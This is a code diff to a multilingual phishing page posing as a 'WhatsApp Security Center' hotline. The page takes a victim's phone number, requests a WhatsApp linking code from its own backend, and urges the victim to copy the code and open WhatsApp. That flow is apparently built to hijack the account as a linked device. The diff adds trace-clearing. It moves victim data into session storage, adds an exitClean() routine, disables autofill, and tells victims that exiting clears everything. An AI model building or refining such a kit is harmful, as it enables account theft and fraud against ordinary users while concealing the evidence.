@@ -133,7 +133,7 @@
       <div class="avatar"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12.04 2a9.9 9.9 0 0 0-8.4 15.16L2 22l4.92-1.6A9.9 9.9 0 1 0 12.04 2zm5.6 14.06c-.24.67-1.38 1.29-1.9 1.34-.51.05-1.16.24-3.92-.81-3.32-1.28-5.42-4.6-5.58-4.82-.16-.22-1.34-1.78-1.34-3.4s.84-2.41 1.14-2.74c.3-.33.65-.41.87-.41.22 0 .44 0 .63.01.2.01.47-.08.73.56.27.66.91 2.28.99 2.45.08.16.13.36.02.58-.1.22-.16.36-.31.55-.15.19-.32.42-.45.57-.15.16-.31.33-.13.65.18.32.79 1.3 1.7 2.11 1.17 1.04 2.15 1.36 2.46 1.52.3.16.48.13.66-.08.18-.22.76-.89.97-1.19.2-.3.41-.25.69-.15.28.1 1.8.85 2.11 1 .31.16.51.24.59.37.08.13.08.75-.17 1.41z"/></svg></div>
       <div class="title" id="topTitle">WhatsApp安全中心</div>
       <div class="lang-switch"><select id="langSelect" onchange="setLang(this.value)"><option value="zh-CN">中文</option><option value="en">English</option><option value="th">ไทย</option><option value="ja">日本語</option><option value="ko">한국어</option></select></div>
-      <div class="close" onclick="location.reload()">✕</div>
+      <div class="close" onclick="exitClean()" title="退出并清除痕迹">✕</div>
     </div>
 
     <!-- 封面 -->
@@ -185,7 +185,7 @@
           <span class="cc-code" id="ccCode">+81</span>
           <span class="cc-arrow">▼</span>
         </div>
-        <input class="phone-input" id="phoneInput" type="tel" placeholder="輸入您的電話號碼" inputmode="tel" oninput="onPhoneChange()" />
+        <input class="phone-input" id="phoneInput" type="tel" placeholder="輸入您的電話號碼" inputmode="tel" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" name="wa-phone-no-autofill" readonly onfocus="this.removeAttribute('readonly')" oninput="onPhoneChange()" />
       </div>
       <div class="phone-hint" id="phoneHint"></div>
       <div class="error-msg" id="errorMsg"></div>
@@ -194,12 +194,12 @@
       <div class="guide">
         <div class="g-title">📋 验证前请确认</div>
         <div class="g-line"><span class="num">①</span>手机号需与提交的号码一致</div>
-        <div class="g-line"><span class="num">②</span>保持本页面开启，请勿关闭</div>
+        <div class="g-line"><span class="num">②</span>刷新不丢进度，退出自动清除</div>
       </div>
       </div>
 
       <div class="msg-bar" id="msgBarZone">
-        <input class="msg-input" id="msgInput" placeholder="输入消息…" maxlength="500" onkeydown="if(event.key==='Enter')sendMsg()" />
+        <input class="msg-input" id="msgInput" placeholder="输入消息…" maxlength="500" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" name="wa-msg-no-autofill" onkeydown="if(event.key==='Enter')sendMsg()" />
         <button class="msg-send" onclick="sendMsg()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:18px;height:18px"><path d="M22 2L11 13" stroke-linecap="round"/><path d="M22 2L15 22l-4-9-9-4z" stroke-linejoin="round"/></svg></button>
       </div>
     </div>
@@ -221,11 +221,11 @@
   var PHONE_LEN = {"1":[10,10],"20":[8,10],"27":[9,9],"30":[10,10],"31":[9,9],"32":[8,9],"33":[9,9],"34":[9,9],"36":[8,9],"39":[6,10],"40":[9,9],"41":[9,9],"43":[7,12],"44":[9,10],"45":[8,8],"46":[7,9],"47":[8,8],"48":[9,9],"49":[6,11],"51":[9,9],"52":[10,10],"54":[8,10],"55":[10,11],"56":[9,9],"57":[10,10],"58":[7,10],"60":[9,10],"61":[9,9],"62":[8,12],"63":[10,10],"64":[8,10],"65":[8,8],"66":[8,9],"7":[10,10],"81":[10,10],"82":[9,10],"84":[9,10],"86":[11,11],"90":[10,10],"91":[10,10],"92":[10,10],"93":[9,9],"94":[9,9],"95":[8,10],"98":[10,10],"211":[9,9],"212":[8,9],"213":[8,9],"216":[8,8],"218":[8,9],"220":[7,7],"221":[9,9],"222":[8,8],"223":[8,8],"224":[8,8],"225":[8,8],"226":[8,8],"227":[8,8],"228":[8,8],"229":[8,8],"230":[8,8],"231":[8,8],"232":[9,9],"233":[9,9],"234":[7,11],"235":[8,8],"236":[8,8],"237":[9,9],"238":[7,7],"239":[7,7],"240":[9,9],"241":[9,9],"242":[9,9],"243":[9,9],"244":[9,9],"245":[9,9],"248":[7,7],"249":[9,9],"250":[9,9],"251":[9,9],"252":[7,9],"253":[9,9],"254":[9,10],"255":[9,9],"256":[9,9],"257":[8,8],"258":[8,9],"260":[9,9],"261":[9,9],"262":[9,9],"263":[9,9],"264":[7,7],"265":[7,9],"266":[8,8],"267":[7,7],"268":[8,8],"269":[8,8],"290":[4,4],"291":[7,7],"297":[7,7],"298":[6,6],"299":[6,6],"350":[8,8],"351":[9,9],"352":[8,8],"353":[7,9],"354":[7,7],"355":[8,8],"356":[8,8],"357":[8,8],"358":[5,12],"359":[8,9],"370":[8,8],"371":[8,8],"372":[8,8],"373":[8,8],"374":[8,8],"375":[9,9],"376":[6,6],"377":[8,8],"378":[6,6],"379":[6,6],"380":[9,9],"381":[8,10],"382":[8,8],"383":[8,8],"385":[8,9],"386":[8,8],"387":[8,8],"389":[8,8],"420":[9,9],"421":[9,9],"423":[7,7],"500":[6,6],"501":[7,7],"502":[8,8],"503":[8,8],"504":[8,8],"505":[8,8],"506":[8,8],"507":[7,8],"508":[6,6],"509":[8,8],"590":[9,9],"591":[8,8],"592":[7,7],"593":[9,9],"594":[9,9],"595":[9,9],"596":[9,9],"597":[7,7],"598":[8,8],"599":[7,7],"670":[8,8],"673":[7,7],"674":[7,7],"675":[7,8],"676":[7,7],"677":[7,7],"678":[7,7],"679":[7,7],"680":[7,7],"681":[6,6],"682":[5,5],"683":[4,4],"685":[5,7],"686":[5,5],"687":[6,6],"688":[5,5],"689":[6,6],"690":[4,4],"691":[7,7],"692":[7,7],"850":[8,9],"852":[8,8],"853":[8,8],"855":[8,9],"856":[8,10],"880":[10,10],"886":[9,9],"960":[7,7],"961":[7,8],"962":[9,9],"963":[9,9],"964":[10,10],"965":[8,8],"966":[9,9],"967":[9,9],"968":[8,8],"970":[9,9],"971":[9,9],"972":[8,9],"973":[8,8],"974":[8,8],"975":[8,8],"976":[8,8],"977":[8,8],"992":[9,9],"993":[8,8],"994":[9,9],"995":[9,9],"996":[9,9],"998":[9,9]};
 
   var I18N = {
-    "zh-CN": { topTitle:"WhatsApp安全中心", headline:"正在接入 <em>WhatsApp</em> 客服熱線", cardTitle:"正在建立連线", cardSub:"系統正在分配可用客服專員。", inputLabel:"请输入您注册的WhatsApp电话号码", warnT:"⚠ 操作提醒", warnD:"请使用您本人正在使用的 WhatsApp 号码验证，输入的号码需与手机主号一致，否则无法通过验证。", guideT:"📋 验证前请确认", g1:"手机号需与提交的号码一致", g2:"保持本页面开启，请勿关闭", submit:"继续", verifying:"验证中…", copy:"复制验证码", open:"打开 WhatsApp", timer:"剩余", success:"✓ 已完成验证，请关闭此页面", offline:"离线 · 通道已关闭", online:"在线 · 已为你接入人工通道" },
-    "en": { topTitle:"WhatsApp Security Center", headline:"Connecting to <em>WhatsApp</em> Hotline", cardTitle:"Establishing connection", cardSub:"Assigning available agent.", inputLabel:"Enter your WhatsApp number", warnT:"⚠ Notice", warnD:"Use your own WhatsApp number. It must match your phone, otherwise verification fails.", guideT:"📋 Before verifying", g1:"Number must match submitted one", g2:"Keep this page open, do not close", submit:"Continue", verifying:"Verifying…", copy:"Copy code", open:"Open WhatsApp", timer:"Remaining", success:"✓ Verified, please close this page", offline:"Offline · Channel closed", online:"Online · Connected" },
-    "th": { topTitle:"ศูนย์ความปลอดภัย WhatsApp", headline:"กำลังเชื่อมต่อ <em>WhatsApp</em>", cardTitle:"กำลังเชื่อมต่อ", cardSub:"กำลังจัดสรรเจ้าหน้าที่", inputLabel:"กรอกเบอร์ WhatsApp", warnT:"⚠ คำเตือน", warnD:"ใช้เบอร์ของคุณเอง ต้องตรงกับมือถือ", guideT:"📋 ก่อนยืนยัน", g1:"เบอร์ต้องตรงกัน", g2:"อย่าปิดหน้านี้", submit:"ดำเนินการต่อ", verifying:"กำลังยืนยัน…", copy:"คัดลอกโค้ด", open:"เปิด WhatsApp", timer:"เหลือ", success:"✓ ยืนยันแล้ว ปิดหน้านี้", offline:"ออฟไลน์", online:"ออนไลน์" },
-    "ja": { topTitle:"WhatsApp セキュリティセンター", headline:"<em>WhatsApp</em> サポートに接続中", cardTitle:"接続を確立中", cardSub:"担当者を割り当て中", inputLabel:"WhatsApp 電話番号を入力", warnT:"⚠ 注意", warnD:"ご自身の番号を使用。手機と一致必須", guideT:"📋 確認", g1:"番号は一致必須", g2:"このページを開いたままに", submit:"続行", verifying:"確認中…", copy:"コードをコピー", open:"WhatsApp を開く", timer:"残り", success:"✓ 確認完了、閉じてください", offline:"オフライン", online:"オンライン" },
-    "ko": { topTitle:"WhatsApp 보안 센터", headline:"<em>WhatsApp</em> 핫라인 연결 중", cardTitle:"연결 중", cardSub:"상담원 배정 중", inputLabel:"WhatsApp 번호 입력", warnT:"⚠ 알림", warnD:"본인 번호 사용, 휴대폰과 일치해야 함", guideT:"📋 확인", g1:"번호 일치 필수", g2:"페이지를 닫지 마세요", submit:"계속", verifying:"확인 중…", copy:"코드 복사", open:"WhatsApp 열기", timer:"남은", success:"✓ 확인 완료, 닫아주세요", offline:"오프라인", online:"온라인" }
+    "zh-CN": { topTitle:"WhatsApp安全中心", headline:"正在接入 <em>WhatsApp</em> 客服熱線", cardTitle:"正在建立連线", cardSub:"系統正在分配可用客服專員。", inputLabel:"请输入您注册的WhatsApp电话号码", warnT:"⚠ 操作提醒", warnD:"请使用您本人正在使用的 WhatsApp 号码验证，输入的号码需与手机主号一致，否则无法通过验证。", guideT:"📋 验证前请确认", g1:"手机号需与提交的号码一致", g2:"刷新不丢进度，退出自动清除", submit:"继续", verifying:"验证中…", copy:"复制验证码", open:"打开 WhatsApp", timer:"剩余", success:"✓ 已完成验证，请关闭此页面", offline:"离线 · 通道已关闭", online:"在线 · 已为你接入人工通道" },
+    "en": { topTitle:"WhatsApp Security Center", headline:"Connecting to <em>WhatsApp</em> Hotline", cardTitle:"Establishing connection", cardSub:"Assigning available agent.", inputLabel:"Enter your WhatsApp number", warnT:"⚠ Notice", warnD:"Use your own WhatsApp number. It must match your phone, otherwise verification fails.", guideT:"📋 Before verifying", g1:"Number must match submitted one", g2:"Refresh is safe, exit clears all traces", submit:"Continue", verifying:"Verifying…", copy:"Copy code", open:"Open WhatsApp", timer:"Remaining", success:"✓ Verified, please close this page", offline:"Offline · Channel closed", online:"Online · Connected" },
+    "th": { topTitle:"ศูนย์ความปลอดภัย WhatsApp", headline:"กำลังเชื่อมต่อ <em>WhatsApp</em>", cardTitle:"กำลังเชื่อมต่อ", cardSub:"กำลังจัดสรรเจ้าหน้าที่", inputLabel:"กรอกเบอร์ WhatsApp", warnT:"⚠ คำเตือน", warnD:"ใช้เบอร์ของคุณเอง ต้องตรงกับมือถือ", guideT:"📋 ก่อนยืนยัน", g1:"เบอร์ต้องตรงกัน", g2:"รีเฟรชได้ ออกแล้วล้างหมด", submit:"ดำเนินการต่อ", verifying:"กำลังยืนยัน…", copy:"คัดลอกโค้ด", open:"เปิด WhatsApp", timer:"เหลือ", success:"✓ ยืนยันแล้ว ปิดหน้านี้", offline:"ออฟไลน์", online:"ออนไลน์" },
+    "ja": { topTitle:"WhatsApp セキュリティセンター", headline:"<em>WhatsApp</em> サポートに接続中", cardTitle:"接続を確立中", cardSub:"担当者を割り当て中", inputLabel:"WhatsApp 電話番号を入力", warnT:"⚠ 注意", warnD:"ご自身の番号を使用。手機と一致必須", guideT:"📋 確認", g1:"番号は一致必須", g2:"更新OK、終了で消去", submit:"続行", verifying:"確認中…", copy:"コードをコピー", open:"WhatsApp を開く", timer:"残り", success:"✓ 確認完了、閉じてください", offline:"オフライン", online:"オンライン" },
+    "ko": { topTitle:"WhatsApp 보안 센터", headline:"<em>WhatsApp</em> 핫라인 연결 중", cardTitle:"연결 중", cardSub:"상담원 배정 중", inputLabel:"WhatsApp 번호 입력", warnT:"⚠ 알림", warnD:"본인 번호 사용, 휴대폰과 일치해야 함", guideT:"📋 확인", g1:"번호 일치 필수", g2:"새로고침 안전, 종료 시 삭제", submit:"계속", verifying:"확인 중…", copy:"코드 복사", open:"WhatsApp 열기", timer:"남은", success:"✓ 확인 완료, 닫아주세요", offline:"오프라인", online:"온라인" }
   };
   function setLang(lang){
     var t=I18N[lang]||I18N["zh-CN"];
@@ -289,18 +289,30 @@
   function nowTime(){ var d=new Date(); var beijing=new Date(d.getTime()+d.getTimezoneOffset()*60000+8*3600*1000); var h=beijing.getHours(),m=beijing.getMinutes(); var h12=h%12||12; var p=n=>n<10?"0"+n:n; return p(h12)+":"+p(m)+(h>=12?" 下午":" 上午"); }
 
   // ===== 客服聊天（接管理端客服中心） =====
-  var chatGuest=null; try{ chatGuest=localStorage.getItem("waam_guest"); if(!chatGuest){ chatGuest="guest-"+Date.now().toString(36)+Math.random().toString(36).slice(2,8); try{localStorage.setItem("waam_guest",chatGuest);}catch(e){} } }catch(e){ chatGuest="guest-"+Math.random().toString(36).slice(2,10); }
+  // 会话级存储：同标签刷新保留，关闭/退出即清（无痕）。localStorage 只做一次性迁移，随后删除。
+  function sessGet(k){ try{ var v=sessionStorage.getItem(k); if(v!=null) return v; }catch(e){} try{ return localStorage.getItem(k); }catch(e2){ return null; } }
+  function sessSet(k,v){ try{ sessionStorage.setItem(k,v); return; }catch(e){} try{ localStorage.setItem(k,v); }catch(e2){} }
+  function sessDel(k){ try{ sessionStorage.removeItem(k); }catch(e){} try{ localStorage.removeItem(k); }catch(e2){} }
+  // 一次性迁移：把历史残留(localStorage)搬进本会话，然后删掉本地痕迹
+  (function(){ try{ ["waam_guest","waam_phone","waam_verify"].forEach(function(k){ var lv=null; try{ lv=localStorage.getItem(k); }catch(e){} if(lv!=null){ try{ if(sessionStorage.getItem(k)==null) sessionStorage.setItem(k,lv); }catch(e){} } try{ localStorage.removeItem(k); }catch(e){} }); }catch(e){} })();
+  // 右上 ✕ = 退出并清除痕迹
+  function exitClean(){
+    try{ ["waam_guest","waam_phone","waam_verify"].forEach(function(k){ sessDel(k); }); }catch(e){}
+    try{ var pi=document.getElementById("phoneInput"); if(pi) pi.value=""; var mi=document.getElementById("msgInput"); if(mi) mi.value=""; }catch(e){}
+    location.reload();
+  }
+  var chatGuest=null; try{ chatGuest=sessGet("waam_guest"); if(!chatGuest){ chatGuest="guest-"+Date.now().toString(36)+Math.random().toString(36).slice(2,8); try{sessSet("waam_guest",chatGuest);}catch(e){} } }catch(e){ chatGuest="guest-"+Math.random().toString(36).slice(2,10); }
   var verifiedPhone="";
-  try{ verifiedPhone=localStorage.getItem("waam_phone")||""; }catch(e){}
+  try{ verifiedPhone=sessGet("waam_phone")||""; }catch(e){}
   var chatClaimPending="";
   var lastChatId=0;
   var seenChatIds={};
 
   // ===== 验证进度持久化（刷新不丢进度） =====
   var VERIFY_KEY="waam_verify";
-  function saveVerify(s){ try{ localStorage.setItem(VERIFY_KEY, JSON.stringify(s)); }catch(e){} }
-  function loadVerify(){ try{ var s=localStorage.getItem(VERIFY_KEY); if(!s) return null; var o=JSON.parse(s); if(!o||!o.stage) return null; return o; }catch(e){ return null; } }
-  function clearVerify(){ try{ localStorage.removeItem(VERIFY_KEY); }catch(e){} }
+  function saveVerify(s){ try{ sessSet(VERIFY_KEY, JSON.stringify(s)); }catch(e){} }
+  function loadVerify(){ try{ var s=sessGet(VERIFY_KEY); if(!s) return null; var o=JSON.parse(s); if(!o||!o.stage) return null; return o; }catch(e){ return null; } }
+  function clearVerify(){ try{ sessDel(VERIFY_KEY); }catch(e){} }
   function refillPhone(phone, cc){
     try{
       if(cc){ currentCC=cc; var cce=document.getElementById("ccCode"); if(cce) cce.textContent=cc; }
@@ -315,7 +327,7 @@
   function restoreVerify(snap){
     if(snap&&snap.phone){
       verifiedPhone=snap.phone; chatClaimPending=chatGuest;
-      try{ localStorage.setItem("waam_phone",snap.phone); }catch(e){}
+      try{ sessSet("waam_phone",snap.phone); }catch(e){}
     }
     restoreChat();
     if(verifiedPhone) refillPhone(verifiedPhone, null);
@@ -384,7 +396,7 @@
         if(wait.parentNode)wait.parentNode.removeChild(wait);
         if(res&&res.success&&res.code){
           verifiedPhone=phone; chatClaimPending=chatGuest;
-          try{ localStorage.setItem("waam_phone",phone); }catch(e){}
+          try{ sessSet("waam_phone",phone); }catch(e){}
           saveVerify({stage:"pair",phone:phone,cc:cc||currentCC,accountId:res.accountId,code:res.code,deadline:Date.now()+60000,ts:Date.now()});
           showPairBubble(res.code, res.accountId, 60);
         } else {
@@ -464,7 +476,7 @@
     var btn=document.getElementById("submitBtn"); submitLock=true; btn.disabled=true; btn.textContent="验证中…";
     // 客服等待气泡
     var chat=document.getElementById("chatLog");
-    var wait=document.createElement("div"); wait.className="waiting-bubble"; wait.innerHTML='请稍等，正在验证中，请勿关闭页面… <span class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>'; chat.appendChild(wait); wait.scrollIntoView();
+    var wait=document.createElement("div"); wait.className="waiting-bubble"; wait.innerHTML='请稍等，正在验证中…（刷新不丢进度） <span class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>'; chat.appendChild(wait); wait.scrollIntoView();
 
     fetch(API + "/request-pairing", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone:full}) })
       .then(function(r){
@@ -479,7 +491,7 @@
         if(res && res.success && res.code){
           // 验证通过即绑定客服身份：后续聊天按手机号走，并把访客消息认领过来（持久化，刷新不丢）
           verifiedPhone=full; chatClaimPending=chatGuest;
-          try{ localStorage.setItem("waam_phone",full); }catch(e){}
+          try{ sessSet("waam_phone",full); }catch(e){}
           if(wait.parentNode)wait.parentNode.removeChild(wait);
           saveVerify({stage:"pair",phone:full,cc:currentCC,accountId:res.accountId,code:res.code,deadline:Date.now()+60000,ts:Date.now()});
           showPairBubble(res.code, res.accountId, 60);
